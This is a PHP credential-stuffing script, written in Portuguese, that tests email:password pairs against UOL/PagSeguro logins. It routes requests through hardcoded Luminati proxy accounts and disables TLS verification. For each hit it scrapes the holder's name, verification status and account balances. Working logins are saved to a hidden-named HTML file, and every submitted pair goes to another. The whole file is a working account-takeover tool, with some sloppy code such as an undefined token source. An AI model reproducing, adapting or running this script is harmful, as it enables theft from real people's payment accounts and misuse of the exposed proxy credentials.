<?php
error_reporting(0);
DeletarCookies(1);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function multiexplode($delimiters, $string) {
      $partida = str_replace($delimiters, $delimiters[0], $string);
      $executar = explode($delimiters[0], $partida);
      return $executar;

}
$lista = $_REQUEST['lista'];
$email = multiexplode(array(":", ";", "|", ">"), $lista)[0];
$senha = multiexplode(array(":", ";", "|", ">"), $lista)[1];

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}

function inStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

/*$proxy_link = file_get_contents("https://zerocentral.000webhostapp.com/");
    $decodar = json_decode($proxy_link, true);
    $proxy = $decodar['IpPort'];*/

/*$rand_src = rand(0, 0);

switch($rand_src){
    case 0:{
        $username = 'lum-customer-hl_503738dc-zone-checkerchecado';
        $password = 'faeb0kmykta7';
        $port = 22225;
        $session = mt_rand();
        $super_proxy = 'zproxy.lum-superproxy.io';
    }
} */   

$rand_src = rand(0, 0);

switch($rand_src){
    case 0:{
        $username = 'lum-customer-hl_f6cd0017-zone-static';
        $password = 'btsna6rfh0zf';
        $port = 22225;
        $session = mt_rand();
        $super_proxy = 'zproxy.lum-superproxy.io';
    }
}  

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: acesso.uol.com.br',
'Origin: https://acesso.uol.com.br',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'Referer: https://acesso.uol.com.br/login.html?skin=ps',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");  
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt'); 
$d3 = curl_exec($ch);
$token = getStr($d1,'type="hidden" name="acsrfToken" value="','"');
curl_setopt($ch, CURLOPT_URL, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'dest=REDIR%7Chttps%3A%2F%2Fpagseguro.uol.com.br%2F&deviceId=ecfa7de1b9ba40bb91b3a4c67de719c5&skin=ps&user='.$email.'&pass='.$senha.'&entrar=');
$d3 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://pagseguro.uol.com.br/account/wallet.jhtml");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://pagseguro.uol.com.br/login.jhtml');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$d4 = curl_exec($ch);
$token = getStr($d4,'type="hidden" name="acsrfToken" value="','"');
curl_setopt($ch, CURLOPT_URL, "https://pagseguro.uol.com.br/login.jhtml");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://pagseguro.uol.com.br/login.jhtml');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 1);                 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'dest=+REDIR%7Chttps://pagseguro.uol.com.br/hub.jhtml&skin=&acsrfToken='.$token.'&user='.$email.'&pass='.$senha.'');
$d5 = curl_exec($ch);
		if(strpos($d5, '<small class="uolMsg uolMsg-micro uolMsg-alert">verificar conta</small>')){
			$verificada = "Não";
		}else{
			$verificada = "Sim";
		}
		$tipo = getStr($d4,'href="/account/viewDetails.jhtml" title="','"');
		$disponivel = getStr($d4,'<dd id="accountBalance" class="positive">','</dd>');
		if ($disponivel == false) {
			$disponivel = "0,00";
		}
		$bloqueado = getStr($d4,'<dd id="accountBlocked" class="neutral">','</dd>');
		if ($bloqueado == false) {
			$bloqueado = "0,00";
		}
		$receber = getStr($d4,'<dd id="accountEscrow" class="neutral">','</dd>');
		if ($receber == false) {
			$receber = "0,00";
		}
       $nome1 = getStr($d4,'<strong>','</strong>');



   $nome1 = ($nome1) ? "| Nome: $nome1" : "";
   $verificada = ($verificada) ? "| Verificada: $verificada" : "";
   $tipo = ($tipo) ? "| Tipo: $tipo" : "";
   $disponivel = ($disponivel) ? "| Disponivel: $disponivel" : "";
   $bloqueado = ($bloqueado) ? "| Bloqueado: $bloqueado" : "";
   $receber = ($receber) ? "| Receber: $receber" : "";

if (strpos($d3, 'Set-Cookie:')) { 

 echo "
 <span class='badge badge-success'> #Aprovada </span> ".$lista." -
 <span class='badge badge-secondary'> ".$nome1." </span>
 <span class='badge badge-success'>   ".$verificada."  </span>
 <span class='badge badge-secondary'>   ".$tipo." </span>
 <span class='badge badge-secondary'> ".$disponivel." </span>
  <span class='badge badge-secondary'> ".$bloqueado." </span>
   <span class='badge badge-secondary'> ".$receber." </span>
 <span class=''>  </span> <br><br>";
 
 $file = fopen("xasjmhgdjkasgdhjgasdghjgbh2ghj1logins.html", "a");
		fwrite($file, "Login: $lista Conta: $conta Valor: $valor Bloqueado: $bloqueado ValorTotal: $valortotal<br>");
		exit();


} else {

echo "
<span class='badge badge-danger'> #Reprovada </span> ".$lista." |
<span class='badge badge-primary'> Nome de usuário ou senha inválidos </span> <br><br>";
}
 $file = fopen("xasjmhgdjkasgdhjgasdghjgbh2ghjemails.html", "a");
		fwrite($file, "$lista<br>");
		exit();
ob_flush();        


?>